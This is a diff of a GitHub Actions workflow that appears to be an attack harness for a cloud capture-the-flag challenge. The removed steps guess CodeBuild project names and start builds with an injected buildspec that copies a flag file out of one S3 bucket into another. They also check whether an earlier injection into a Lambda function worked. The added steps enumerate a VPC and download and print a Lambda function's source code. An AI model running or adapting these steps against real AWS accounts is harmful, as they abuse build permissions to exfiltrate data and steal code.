@@ -19,26 +19,31 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Try start CodeBuild with guessed project names
+      - name: Describe VPC
         run: |
-          for PROJECT in codebuild_vpc nslookupv2 cicd deploy ctf attack; do
-            echo "===== trying project: $PROJECT ====="
-            aws codebuild start-build \
-              --project-name "$PROJECT" \
-              --region us-east-1 \
-              --buildspec-override '{"version":"0.2","phases":{"build":{"commands":["aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt && aws s3 cp /tmp/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_out.txt"]}}}' \
-              --query 'build.id' --output text 2>&1 || true
-          done
+          echo "===== VPC ====="
+          aws ec2 describe-vpcs --vpc-ids vpc-09328d3fa21dce320
 
-      - name: Wait for build
-        run: sleep 45
-
-      - name: Read flag from platform bucket
+      - name: Get Lambda code location
         run: |
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag_out.txt - || echo "not found"
+          echo "===== LAMBDA CODE LOCATION ====="
+          aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text
 
-      - name: Also check Lambda description - did previous injection work?
+      - name: Download code.zip via presigned URL
         run: |
-          aws lambda get-function-configuration \
-            --function-name nslookupv2 --region us-east-1 \
-            --query '{Description: Description, Environment: Environment}'
+          URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
+          curl -sL "$URL" -o code.zip
+
+      - name: Download code.zip directly from S3 (fallback)
+        continue-on-error: true
+        run: |
+          aws s3 cp s3://codec4f26c862a321ef5/code.zip ./code_s3.zip
+
+      - name: Unzip and show handler
+        run: |
+          mkdir -p extracted
+          unzip -o code.zip -d extracted || unzip -o code_s3.zip -d extracted
+          echo "===== FILES ====="
+          find extracted -type f
+          echo "===== lambda_function.py ====="
+          cat extracted/lambda_function.py || true
